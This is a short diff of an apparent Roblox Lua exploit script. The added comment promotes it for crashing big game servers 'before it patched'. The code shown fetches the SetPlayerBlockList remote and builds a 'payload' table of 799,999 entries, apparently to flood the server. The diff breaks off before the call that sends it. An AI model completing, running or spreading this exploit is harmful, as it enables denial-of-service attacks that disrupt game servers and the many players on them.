@@ -1,3 +1,7 @@
+--[[ Still works but you more than likely will get disconnected first before it crashes, if it happens just rejoin. Works very well in big games!
+
+go crazy before it patched
+]]
 local remote = game:FindFirstChild("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
 local entries = 799999
 local payload = table.create(entries)
